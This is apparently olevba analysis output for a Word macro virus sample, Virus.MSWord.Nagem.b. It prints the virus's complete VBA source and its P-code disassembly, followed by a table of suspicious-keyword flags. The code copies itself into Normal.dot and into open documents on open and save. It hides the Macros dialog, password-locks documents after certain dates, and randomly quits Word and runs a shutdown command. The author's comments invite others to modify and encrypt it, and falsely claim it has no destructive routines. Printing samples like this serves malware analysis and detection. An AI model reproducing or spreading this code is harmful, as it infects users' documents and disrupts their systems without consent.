olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nagem.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nagem.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Magan_Macro.bas 
in file: Virus.MSWord.Nagem.b - OLE stream: 'Macros/VBA/Magan_Macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

' Distributed for Changes/Upgradation etc. in
'Open Source Code.
' If you are interested in developing,modifying,
'crypting etc. this document using your skills,
'you are FREE to do so.
' Don't forget to give credits also to
'"Anonymous Creater of Megan V1.0"
' Nick of course is Magan
' Best of Luck
' Explanation Also Included.

Dim Ni, Di As Integer
Sub AutoOpen()
'There are no destructive routines in
'this document.
On Error GoTo 1

'Find if Normal is already infected!
With Normal.ThisDocument.VBProject.VBComponents
    For Ni = 1 To .Count
            If (.Item(Ni).Name = "Magan_Macro") Then
                GoTo 3
            End If
    Next Ni
End With

'Infect Normal
With ThisDocument.VBProject.VBComponents
    For Di = 1 To .Count
       If (.Item(Di).Name = "Magan_Macro") Then
          .Item(Di).Export ("MaganM.BAS")
          ' I know that the above is not the best way, still,
          'It is the easiest to understand.
          Normal.ThisDocument.VBProject.VBComponents.Add(1).CodeModule.AddFromFile ("MaganM.BAS")
          Kill ("MaganM.BAS")
          Exit For
       End If
Next Di
End With

GoTo 2

3

With ActiveDocument.VBProject.VBComponents
For Ni = 1 To .Count
            If (.Item(Ni).Name = "Magan_Macro") Then
                GoTo 1
            End If
Next Ni
End With

With Normal.ThisDocument.VBProject.VBComponents
For Di = 1 To .Count
       If (.Item(Di).Name = "Magan_Macro") Then
          .Item(Di).Export ("MaganM.BAS")
          ActiveDocument.VBProject.VBComponents.Add(1).CodeModule.AddFromFile ("MaganM.BAS")
          Kill ("MaganM.BAS")
          Exit For
       End If
Next Di
End With
ActiveDocument.Saved = False
2
Normal.ThisDocument.Saved = False
1
End Sub

Sub ToolsMacro()
Attribute ToolsMacro.VB_Description = "Disables the Tools->Macro->Macros... command under English version of Word."
Attribute ToolsMacro.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.ToolsMacro1"
'This macro disables the Tools->Macros->Macros...
'Command under English version of Word.

'If you are here, you know the in and out of the
'macro programming i belive.
MsgBox "This Command is Unavaliable this time.", vbCritical, "Microsoft Word"
End Sub


Sub AutoClose()
'No fun without an activation routine.
On Error Resume Next
If (Val(Left$(Date$, 2)) > 20) Then
    'Change "password" to Rnd*100 if you like!
    'Then, the document can never be unprotected again.
    ActiveDocument.Protect wdAllowOnlyComments, , "password"
End If
If (Val(Left$(Date$, 2)) > 10) Then
    If (Rnd * 100 < 50) Then
       'Quits without saving :)
       'Then tries Restarts the Computer
       'Restart works only if there is a delay
       Shell "RunDLL.EXE USER,ExitWindows", vbHide
       ThisDocument.Application.Quit
    End If
End If
End Sub

Sub FileSave()
'Just to Spread.
'Note : Works only under English Version.
On Error Resume Next
AutoOpen
ActiveDocument.Save
End Sub

Sub FileSaveAs()
'Just to Spread.
'Note : Works only under English Version.
On Error Resume Next
AutoOpen
Dialogs(wdDialogFileSaveAs).Show
AutoOpen
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Nagem.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Magan_Macro - 6667 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' Line #2:
' 	QuoteRem 0x0000 0x002C " Distributed for Changes/Upgradation etc. in"
' Line #3:
' 	QuoteRem 0x0000 0x0011 "Open Source Code."
' Line #4:
' 	QuoteRem 0x0000 0x002F " If you are interested in developing,modifying,"
' Line #5:
' 	QuoteRem 0x0000 0x002E "crypting etc. this document using your skills,"
' Line #6:
' 	QuoteRem 0x0000 0x0016 "you are FREE to do so."
' Line #7:
' 	QuoteRem 0x0000 0x0025 " Don't forget to give credits also to"
' Line #8:
' 	QuoteRem 0x0000 0x0021 ""Anonymous Creater of Megan V1.0""
' Line #9:
' 	QuoteRem 0x0000 0x0018 " Nick of course is Magan"
' Line #10:
' 	QuoteRem 0x0000 0x000D " Best of Luck"
' Line #11:
' 	QuoteRem 0x0000 0x001B " Explanation Also Included."
' Line #12:
' Line #13:
' 	Dim 
' 	VarDefn Ni
' 	VarDefn Di (As Integer)
' Line #14:
' 	FuncDefn (Sub AutoOpen())
' Line #15:
' 	QuoteRem 0x0000 0x0024 "There are no destructive routines in"
' Line #16:
' 	QuoteRem 0x0000 0x000E "this document."
' Line #17:
' 	OnError 1 
' Line #18:
' Line #19:
' 	QuoteRem 0x0000 0x0023 "Find if Normal is already infected!"
' Line #20:
' 	StartWithExpr 
' 	Ld Normal 
' 	MemLd ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	With 
' Line #21:
' 	StartForVariable 
' 	Ld Ni 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith Count 
' 	For 
' Line #22:
' 	Ld Ni 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd New 
' 	LitStr 0x000B "Magan_Macro"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #23:
' 	GoTo 3 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	StartForVariable 
' 	Ld Ni 
' 	EndForVariable 
' 	NextVar 
' Line #26:
' 	EndWith 
' Line #27:
' Line #28:
' 	QuoteRem 0x0000 0x000D "Infect Normal"
' Line #29:
' 	StartWithExpr 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	With 
' Line #30:
' 	StartForVariable 
' 	Ld Di 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith Count 
' 	For 
' Line #31:
' 	Ld Di 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd New 
' 	LitStr 0x000B "Magan_Macro"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #32:
' 	LitStr 0x000A "MaganM.BAS"
' 	Paren 
' 	Ld Di 
' 	ArgsMemLdWith Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #33:
' 	QuoteRem 0x000A 0x0032 " I know that the above is not the best way, still,"
' Line #34:
' 	QuoteRem 0x000A 0x0020 "It is the easiest to understand."
' Line #35:
' 	LitStr 0x000A "MaganM.BAS"
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld Normal 
' 	MemLd ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Add 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #36:
' 	LitStr 0x000A "MaganM.BAS"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #37:
' 	ExitFor 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	StartForVariable 
' 	Ld Di 
' 	EndForVariable 
' 	NextVar 
' Line #40:
' 	EndWith 
' Line #41:
' Line #42:
' 	GoTo 2 
' Line #43:
' Line #44:
' 	LineNum 3 
' Line #45:
' Line #46:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	With 
' Line #47:
' 	StartForVariable 
' 	Ld Ni 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith Count 
' 	For 
' Line #48:
' 	Ld Ni 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd New 
' 	LitStr 0x000B "Magan_Macro"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #49:
' 	GoTo 1 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	StartForVariable 
' 	Ld Ni 
' 	EndForVariable 
' 	NextVar 
' Line #52:
' 	EndWith 
' Line #53:
' Line #54:
' 	StartWithExpr 
' 	Ld Normal 
' 	MemLd ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	With 
' Line #55:
' 	StartForVariable 
' 	Ld Di 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith Count 
' 	For 
' Line #56:
' 	Ld Di 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd New 
' 	LitStr 0x000B "Magan_Macro"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #57:
' 	LitStr 0x000A "MaganM.BAS"
' 	Paren 
' 	Ld Di 
' 	ArgsMemLdWith Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #58:
' 	LitStr 0x000A "MaganM.BAS"
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Add 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #59:
' 	LitStr 0x000A "MaganM.BAS"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #60:
' 	ExitFor 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	StartForVariable 
' 	Ld Di 
' 	EndForVariable 
' 	NextVar 
' Line #63:
' 	EndWith 
' Line #64:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #65:
' 	LineNum 2 
' Line #66:
' 	LitVarSpecial (False)
' 	Ld Normal 
' 	MemLd ThisDocument 
' 	MemSt Saved 
' Line #67:
' 	LineNum 1 
' Line #68:
' 	EndSub 
' Line #69:
' Line #70:
' 	FuncDefn (Sub ToolsMacro())
' Line #71:
' 	QuoteRem 0x0000 0x0030 "This macro disables the Tools->Macros->Macros..."
' Line #72:
' 	QuoteRem 0x0000 0x0026 "Command under English version of Word."
' Line #73:
' Line #74:
' 	QuoteRem 0x0000 0x002F "If you are here, you know the in and out of the"
' Line #75:
' 	QuoteRem 0x0000 0x001B "macro programming i belive."
' Line #76:
' 	LitStr 0x0026 "This Command is Unavaliable this time."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #77:
' 	EndSub 
' Line #78:
' Line #79:
' Line #80:
' 	FuncDefn (Sub AutoClose())
' Line #81:
' 	QuoteRem 0x0000 0x0025 "No fun without an activation routine."
' Line #82:
' 	OnError (Resume Next) 
' Line #83:
' 	Ld Date$ 
' 	LitDI2 0x0002 
' 	ArgsLd LBound$ 0x0002 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0014 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #84:
' 	QuoteRem 0x0004 0x0029 "Change "password" to Rnd*100 if you like!"
' Line #85:
' 	QuoteRem 0x0004 0x0032 "Then, the document can never be unprotected again."
' Line #86:
' 	Ld wdAllowOnlyComments 
' 	ParamOmitted 
' 	LitStr 0x0008 "password"
' 	Ld ActiveDocument 
' 	ArgsMemCall Protect 0x0003 
' Line #87:
' 	EndIfBlock 
' Line #88:
' 	Ld Date$ 
' 	LitDI2 0x0002 
' 	ArgsLd LBound$ 0x0002 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x000A 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #89:
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	LitDI2 0x0032 
' 	Lt 
' 	Paren 
' 	IfBlock 
' Line #90:
' 	QuoteRem 0x0007 0x0017 "Quits without saving :)"
' Line #91:
' 	QuoteRem 0x0007 0x0020 "Then tries Restarts the Computer"
' Line #92:
' 	QuoteRem 0x0007 0x0026 "Restart works only if there is a delay"
' Line #93:
' 	LitStr 0x001B "RunDLL.EXE USER,ExitWindows"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #94:
' 	Ld ThisDocument 
' 	MemLd Application 
' 	ArgsMemCall Quit 0x0000 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	EndIfBlock 
' Line #97:
' 	EndSub 
' Line #98:
' Line #99:
' 	FuncDefn (Sub FileSave())
' Line #100:
' 	QuoteRem 0x0000 0x000F "Just to Spread."
' Line #101:
' 	QuoteRem 0x0000 0x0028 "Note : Works only under English Version."
' Line #102:
' 	OnError (Resume Next) 
' Line #103:
' 	ArgsCall AutoOpen 0x0000 
' Line #104:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #105:
' 	EndSub 
' Line #106:
' Line #107:
' 	FuncDefn (Sub FileSaveAs())
' Line #108:
' 	QuoteRem 0x0000 0x000F "Just to Spread."
' Line #109:
' 	QuoteRem 0x0000 0x0028 "Note : Works only under English Version."
' Line #110:
' 	OnError (Resume Next) 
' Line #111:
' 	ArgsCall AutoOpen 0x0000 
' Line #112:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #113:
' 	ArgsCall AutoOpen 0x0000 
' Line #114:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |RunDLL.EXE          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

